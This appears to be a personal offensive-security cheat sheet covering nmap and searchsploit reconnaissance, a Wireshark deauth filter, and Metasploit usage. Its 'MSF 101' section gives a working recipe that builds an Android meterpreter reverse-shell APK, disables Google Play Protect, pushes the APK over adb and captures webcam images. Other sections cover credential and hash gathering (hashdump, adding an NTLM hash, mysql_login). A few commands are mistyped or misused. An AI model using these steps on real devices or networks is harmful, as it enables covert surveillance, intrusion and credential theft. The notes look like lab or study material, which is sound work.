# OffSec  
  
## Network Analysis  

nmap -sn 192.168.1.*  
nmap {ips} -A -oX hosts.xml  
searchsploit --nmap hosts.xml --json 2>&1 | tee result.json  
  
nmap -T4 -A -v 192.168.1.1 -sV -oX hosts.xml  
searchsploit --nmap hosts.xml --json | tee router_hosts.json  
  
- Wireshark deauth packages:  
wlan.fc.type_subtype == 12  

## MSF 101  

msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.110.126 LPORT=4444 -o android_client.apk  
  
disable Google Protect  
adb connect 192.168.110.230  
adb push android_client.apk /storage/self/primary  
  
msfconsole  
set PAYLOAD multi/handler  
set LHOST 192.168.110.126  
set LPORT 4444  
exploit  
  
Meterpreter:  
webcam_list  
webcam_snap  
  
## MSF  

ddbb:  
systemctl start postgresql  
msfdb init  
db_status  
  
MSF Workspaces:  
workspace  
workspace lab3  
add -> workspace -a lab1  
del -> workspace -d lab1  
  
Other:  
db_nmap -A 192.168.1.1  (shitty snap integration)  
(from msf) db_nmap --unprivileged -T4 -A -Ao nmap_scans/scan_workspace.xml  
nmap -v -T4 -A -oA nmap_scans/%D.xml  
sudo chowm -R username nmap_scans/*.xml  
db_import ~/nmap_scans/*.xml  
  
List by:  
hosts (display scan)  
hosts -c address,os_flavor -S Linux (-c FILTER, -S search)  
services -c name,info -S http  
services -c name,info -p 445  
services -c port,proto,state -p 70-81  
  
Backup:  
db_export -f xml -a workspace_name  
db_import workspace_name  
services -s http -c port 172.16.194.134 -o /root/msfu/http.csv  
  
Credentials:  
creds  
(add) creds -a 172.16.194.134 -p 445 -u Administrator -P 7bf4f254b222bb24aad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e:::  
  
Loot i.e.:  
use post/linux/gather/hashdump  
run  
loot  (--add to save to ddbb, default just lists)  
  
Exploits:  
use  
show targets  
show payloads  
show options  
show advanced  
show evasion  
  
## Exploit i.e  

nmap -v -T4 -A -oA nmap_scans/%D.xml  
sudo chown -R username nmap_scans/*.xml  
db_import ~/nmap_scans/*.xml  
use mysql_login  
hosts  
hosts -S Linux -R  
